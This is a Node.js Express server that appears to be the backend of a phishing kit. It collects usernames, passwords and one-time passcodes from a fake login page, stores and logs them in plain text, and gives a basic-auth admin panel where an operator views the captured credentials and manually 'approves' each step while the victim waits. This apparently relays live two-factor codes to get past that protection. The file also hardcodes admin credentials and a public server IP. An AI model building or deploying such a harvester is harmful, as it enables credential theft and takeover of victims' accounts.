const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = 3000;

// Simple Basic Auth middleware
const basicAuth = (req, res, next) => {
  const authHeader = req.headers.authorization;

  if (!authHeader) {
    res.set('WWW-Authenticate', 'Basic realm="Admin Area"');
    return res.status(401).send('Authentication required.');
  }

  const base64Credentials = authHeader.split(' ')[1];
  const credentials = Buffer.from(base64Credentials, 'base64').toString('ascii');
  const [username, password] = credentials.split(':');

  // TODO: Replace these with your desired admin username/password
  const ADMIN_USER = 'goldfingaz';
  const ADMIN_PASS = 'Miamia305';

  if (username === ADMIN_USER && password === ADMIN_PASS) {
    return next();
  } else {
    res.set('WWW-Authenticate', 'Basic realm="Admin Area"');
    return res.status(401).send('Invalid credentials.');
  }
};

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// State variables
let loginData = null;
let approved = false;
let otpApproved = false;

/* ==============================
   USER ROUTES
============================== */

// Serve login page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Serve admin panel (protected by basic auth)
app.get('/admin', basicAuth, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// User submits login (username, password)
app.post('/simulate-login', (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ message: 'Username and password are required' });
  }

  loginData = { username, password, otp: null };
  approved = false;
  otpApproved = false;

  console.log(`📥 Login submitted: ${JSON.stringify(loginData)}`);
  res.json({ message: 'Login data submitted' });
});

// User submits OTP (step 2)
app.post('/submit-otp', (req, res) => {
  const { otp } = req.body;

  if (!loginData) {
    return res.status(400).json({ message: 'No login session found' });
  }

  if (!otp) {
    return res.status(400).json({ message: 'OTP is required' });
  }

  loginData.otp = otp;
  otpApproved = false;

  console.log(`📥 OTP submitted: ${otp}`);
  res.json({ message: 'OTP submitted successfully' });
});

// Frontend polls to check if OTP is approved by admin
app.post('/verify-otp', (req, res) => {
  if (!loginData) {
    return res.status(400).json({ success: false, message: 'No login data submitted' });
  }

  if (!approved) {
    return res.status(403).json({ success: false, message: 'Login not approved yet' });
  }

  if (!otpApproved) {
    return res.status(403).json({ success: false, message: 'OTP not approved yet' });
  }

  return res.json({ success: true, message: 'OTP approved, access granted' });
});

/* ==============================
   ADMIN ROUTES (protected by basicAuth)
============================== */

// Admin approves login
app.post('/approve-login', basicAuth, (req, res) => {
  if (!loginData) {
    return res.status(400).json({ message: 'No login data to approve' });
  }

  approved = true;
  console.log('✅ Login approved by admin.');
  res.json({ message: 'Login approved' });
});

// Admin approves OTP
app.post('/approve-otp', basicAuth, (req, res) => {
  if (!loginData || !loginData.otp) {
    return res.status(400).json({ message: 'No OTP data to approve' });
  }

  otpApproved = true;
  console.log('✅ OTP approved by admin.');
  res.json({ message: 'OTP approved' });
});

// Admin resets the session
app.post('/reset-login', basicAuth, (req, res) => {
  console.log('🔁 Login session reset by admin.');
  loginData = null;
  approved = false;
  otpApproved = false;
  res.json({ message: 'Login reset successfully' });
});

// Admin gets current login data
app.get('/get-login-data', basicAuth, (req, res) => {
  res.json({ loginData, approved, otpApproved });
});

/* ==============================
   SERVER START
============================== */
app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Server running at http://158.101.117.189:${PORT}`);
});
